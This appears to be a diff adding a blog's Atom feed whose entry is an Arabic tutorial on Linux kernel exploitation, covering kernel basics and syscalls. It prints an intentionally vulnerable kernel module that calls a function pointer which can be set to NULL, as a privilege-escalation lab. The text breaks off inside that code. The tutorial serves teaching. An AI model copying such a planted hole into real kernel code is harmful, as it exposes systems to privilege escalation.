@@ -1,0 +1,866 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-08-13T21:49:07-07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">wes4m</title><subtitle>Blogging in hopes of being l33t one day</subtitle><entry><title type="html">إستغلال ثغرات النواة Kernel exploitation</title><link href="http://localhost:4000/misc/2019/08/13/kernelexploitationbasic.html" rel="alternate" type="text/html" title="إستغلال ثغرات النواة Kernel exploitation" /><published>2019-08-13T04:51:01-07:00</published><updated>2019-08-13T04:51:01-07:00</updated><id>http://localhost:4000/misc/2019/08/13/kernelexploitationbasic</id><content type="html" xml:base="http://localhost:4000/misc/2019/08/13/kernelexploitationbasic.html">&lt;p&gt;من اكثر الامثلة شيوعآ للإستخدام في هذا الموضوع هي مصطلحات مثل Android rooting, IOS Jailbreak ، فالكثير منا على إطلاع بها وبالغرض منها. ولكن هل تسائلت من قبل كيف تعمل في عمقها ؟&lt;/p&gt;
+
+&lt;p&gt;أيضآ  لماذا لايمكنك إنهاء عمليات الـ Anti virus من مدير المهام في نظام وندوز بكل بساطة ؟ أو كيف تخفي بعض ملفات الإختراق نفسها عن برامج تتبع الإتصالات ومدير المهام وغيره.&lt;/p&gt;
+
+&lt;p&gt;كل هذه الإمور والكثير من الأمثلة الإخرى يمكن تنفيذها بعدة طرق أحدها ومن أهمها هي إستخدام نواة النظام وإستغلالها.&lt;/p&gt;
+
+&lt;h4 id=&quot;ماهي-النواة-kernel-&quot;&gt;ماهي النواة (Kernel) ؟&lt;/h4&gt;
+
+&lt;p&gt;بشكل مبسط، تعمل أنظمة التشغيل مثل Windows, Linux, IOS وغيرها بنظام الطبقات والنواة هي أحد هذه الطبقات&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/content/os-kernel-layers.png&quot; alt=&quot;kernel-layers&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;فماتراه كمستخدم عادي هو الـ Userspace أو الطبقة الاولى اللتي تحتوي على البرامج وسطح المكتب وغيره من واجهات، تليها النواة واللتي بدورها تتواصل مع عتاد الجهاز من ذاكرة، لوحة مفاتيح، المعالج وغيره .. فهي جزء حساس جدآ وغير قابل للأخطاء البرمجية. على سبيل المثال في الـ Userspace عندما يحدث خطأ في برنامج ما قد يتوقف البرنامج عن العمل أو يتمكن من تفادي الخطأ عن طريق الـ Exception handlers&lt;/p&gt;
+
+&lt;p&gt;بينما الأخطاء في النواة قد تؤدي لعطب أجهزة وفي الغالب توقف النظام وإجبارك على إعادة تشغيله.&lt;/p&gt;
+
+&lt;p&gt;النواة مسؤولة عن التواصل مع العتاد والمدخلات والمخرجات للجهاز وإدارة نظام التشغيل بشكل مفصل جددآ فهي المسؤولة عن التواصل مع الذاكرة وحجز المساحات وعن تنظيم الصلاحيات وإدارة عمليات النظام وجدولتها، وأيضا حماية المستخدم وتوفير أمكانيات للعليات بالتواصل فيما بينها (IPC) وغيرها الكثير من مسؤوليات كبيرة تعق على النواة.&lt;/p&gt;
+
+&lt;p&gt;تعمل أغلب أنوية الأنظمة على شكل Drivers &amp;amp; Modules على عكس الـ Userspace اللذي يعمل على شكل تطبيقات في الغالب.&lt;/p&gt;
+
+&lt;h4 id=&quot;أين-تقع-النواة-&quot;&gt;أين تقع النواة ؟&lt;/h4&gt;
+
+&lt;p&gt;كما نعلم بأنه عند تشغيل أي برنامج يقوم النظام ( النواة ) بحجز مساحة في الذاكرة للبرنامج ومن ثم القيام بعلميات تجهيز الذاكرة وتحميل البرنامج فيها وجدولته وتشغيله. لكل برنامج مساحة في الذاكرة محددة قد تبدوا جميع موجوة في نفس العنوان من الذاكرة وذلك بسبب ( Virtual address space ) وهو موضوع واسع يمكنك القراءة فيه.&lt;/p&gt;
+
+&lt;p&gt;بشكل مبسط هو عنوان وهمي أو إفتراضي يعطى لكل عملية ولكنه مربوط بعنوان آخر على حسب العملية (Physical address) في الذاكرة.&lt;/p&gt;
+
+&lt;p&gt;فالنواة توجد في منطقة ثابته في الذاكرة ويتم إعطاء عنوان إفتراضي لها ايضا مع كل عملية.&lt;/p&gt;
+
+&lt;p&gt;ففي أنظمة الـ 64-bit سنرى أن لكل عملية عنواين إفتراضيه في الذاكرة من 0x000’00000000 - 0x7FF’FFFFFFFF&lt;/p&gt;
+
+&lt;p&gt;بينما في 32-bit فالنطاق هو من  0x00000000 - 0x7FFFFFFF&lt;/p&gt;
+
+&lt;p&gt;ولكل عملية يتم تقسيم النطاق فيربط جزء منه للنواة لتصبح كل عملية قادرة على التواصل مع النواة.&lt;/p&gt;
+
+&lt;p&gt;صورة مثال لذاكرة عملية في النظام:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.stack.imgur.com/5PUMH.jpg&quot; alt=&quot;Image result for 64 bit process address space&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;كيف-تتواصل-البرامج-مع-النواة-&quot;&gt;كيف تتواصل البرامج مع النواة ؟&lt;/h4&gt;
+
+&lt;p&gt;تتعمد طريقة التواصل على نظام التشغيل وآليته. لنأخد على سبيل المثال Linux&lt;/p&gt;
+
+&lt;p&gt;عندما يقوم مبرمج بعمل عملية وظيفتها طباعة نص للمستخدم فتسلسل الأحداث هو كالتالي&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hello&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;يمكننا عمل كومبايل وتتبع العملية عن طريق ltrace &amp;amp; strace أو تتبع سورس كود فنكشن printf وسنرى أن المسار التالي هو المتبع&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;printf(&quot;hello&quot;)
+	fprintf( stdout, &quot;hello world\n&quot; )
+		write(.... )
+			__libc_write(...)
+				syscall to write
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;ومايهمنا هنا هو النقطة الأخيرة SYSCALL فهذه هي الوسيلة الأساسية في التواصل مع النواة. وظيفتها تغيير مود المعالج الى kernel mode ونقل التنفيد للنواة فالـ SYSCALL هي تعليمة محددة &lt;code class=&quot;highlighter-rouge&quot;&gt;INT 0x80&lt;/code&gt; مع معلومات يتم وضعها في المسجلات والذاكرة&lt;/p&gt;
+
+&lt;p&gt;تقوم بعمل Exception فيقوم المعالج بدوره بالعثور على عنوان الـ Exception handler وهو ثابت تحت مسمى Vector 128 أو System call handler ويشير إلى فنكشن بإسم &lt;code class=&quot;highlighter-rouge&quot;&gt;system_call&lt;/code&gt; موجود بالنواة يقوم بتوجيه المعطيات على حسب رقم موجود في أحد المسجلات ( Registers ) فيوجهه للفنكشن المناسبة في حالتنا هذه &lt;code class=&quot;highlighter-rouge&quot;&gt;sys_write&lt;/code&gt; الموجودة في النواة واللتي ستقوم بالعملية المطلوبة والتواصل مع الشاشة لطباعة النص.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://books.gigatux.nl/mirror/kerneldevelopment/0672327201/ch05lev1sec3.html&quot;&gt;للمزيد من المعلومات&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;لماذا-لايمكننا-إستدعاء-عملية-sys_write-الموجودة-في-النواة-مباشرة-من-الـ-userspace-&quot;&gt;لماذا لايمكننا إستدعاء عملية sys_write الموجودة في النواة مباشرة من الـ Userspace ؟&lt;/h4&gt;
+
+&lt;p&gt;لانها ستعدم إنفصالية النواة عن الـ Userspace وستؤدي الى مشاكل امنية وعدم إستقرار في النظام فتواصل العمليات مباشرة مع النواة كما ناقشت سابقآ من السهل أن يؤدي لإغلاق النظام.&lt;/p&gt;
+
+&lt;h2 id=&quot;ثغرات-النواة&quot;&gt;ثغرات النواة&lt;/h2&gt;
+
+&lt;p&gt;بالرغم من طول المقدمة السابقة إلا أنها مختصرة ولاتعطي للنواة نصيبها من الشرح فهي أكبر واهم جزء في أنظمة التشغيل.&lt;/p&gt;
+
+&lt;p&gt;أما الآن فكيف يمكننا الوصول لذاكرة النواة، فالمعالج من وظيفته حماية ذاكرة النواة فلا يمكن للمبرمج بكل بساطة أن يحاول القراءة من عنوان ضمن نطاق ذاكرة النواة أو الكتابة إليه أو القفز لتنفيد كود فيه.&lt;/p&gt;
+
+&lt;p&gt;إلا أنه هناك بعض الهجمات اللتي تستهدف المعالج وبعض الالكترونيات في الجهاز مثل &lt;a href=&quot;https://meltdownattack.com&quot;&gt;Meltdown &amp;amp; Spectre&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;ولكنني سأتحدث حول ثغرات تنتج بسبب أخطاء برمجية سواء من مبرمجي Drivers &amp;amp; Modules النظام أو من شركات خارجية تقوم ببرمجة Drivers خاصة بهم للعمل مع النظام مثل كروت الشاشة وكروت الشبكة وغيرها من أجهزة أو برامج تحتاج لعمل Driver خاص.&lt;/p&gt;
+
+&lt;p&gt;فالثغرات التي تحدث بالنواة هي نفسها التي يمكنك العثور عليها في الـ Usersapce مثل ثغرات الـ Bufferover flow, use-after-free, race conditions وغيرها من ثغرات مع إختلاف طرق الإستغلال، أغلب ثغرات النواة تكون معقدة وعبارة عن سلسلة من الثغرات مربوطة ببعضها (exploit chain) للوصول للهدف.&lt;/p&gt;
+
+&lt;p&gt;كما طرحت في مقدمة الموضوع، على سبيل المثال أحد طرق عمل root لأجهزة Android هي ربط عدد من ثغرات النظام ببعضها بدئآ من الـ Userspace حتى الوصول للنواة (Kernel) ومن ثم التعديل على جدول الصلاحيات على سبيل المثال وإعطاء عملية محددة أعلى صلاحية في الجهاز root.&lt;/p&gt;
+
+&lt;p&gt;في هذا الموضوع سأتطرق لثغرة واحد فقط مع مثال لإستغلالها للحصول على رفع صلاحية (LPE - local privilege escalation)&lt;/p&gt;
+
+&lt;h4 id=&quot;module-مبسط-لنواة-linux&quot;&gt;Module مبسط لنواة Linux&lt;/h4&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://blog.sourcerer.io/writing-a-simple-linux-kernel-module-d9dc3762c234&quot;&gt;شرح مفصل لطريقة برمجة Module للنواة&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;قمت ببرمجة Module بسيط يحتوي على ثغرة يمكن إستغلالها لرفع الصلاحيات.&lt;/p&gt;
+
+&lt;p&gt;بإستخدام الشرح السابق لتحميل مستلزمات الكومبايل. قم ببناء الـ Module التالي وتنصيبه في النواة&lt;/p&gt;
+
+&lt;h5 id=&quot;wes4mc&quot;&gt;wes4m.c&lt;/h5&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;linux/init.h&amp;gt;
+#include &amp;lt;linux/module.h&amp;gt;
+#include &amp;lt;linux/kernel.h&amp;gt;
+#include &amp;lt;linux/fs.h&amp;gt;
+#include &amp;lt;linux/uaccess.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;MODULE_LICENSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GPL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;MODULE_AUTHOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wes4m&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;MODULE_DESCRIPTION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Exploit me to control the kernel&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;MODULE_VERSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0.01&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#define DEVICE_NAME &quot;wes4m&quot;
+&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;major_num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fun_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;device_open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;device_release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;device_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loff_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;device_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loff_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_operations&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_ops&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+ &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;device_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+ &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;device_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+ &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;open&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;device_open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+ &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;release&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;device_release&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;incCounter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;device_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loff_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;printk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_ALERT&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;This operation is not supported.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EINVAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;device_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loff_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;copy_from_user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EFAULT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;printk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_ALERT&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Write called with command %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    	&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    		&lt;span class=&quot;c1&quot;&gt;// Clean up &lt;/span&gt;
+    		&lt;span class=&quot;n&quot;&gt;fun_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    		&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    		&lt;span class=&quot;n&quot;&gt;printk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_ALERT&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Cleaned up&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    	&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    		&lt;span class=&quot;c1&quot;&gt;// Increase counter and print&lt;/span&gt;
+    		&lt;span class=&quot;n&quot;&gt;fun_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    		&lt;span class=&quot;n&quot;&gt;printk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_ALERT&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Counter is now %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
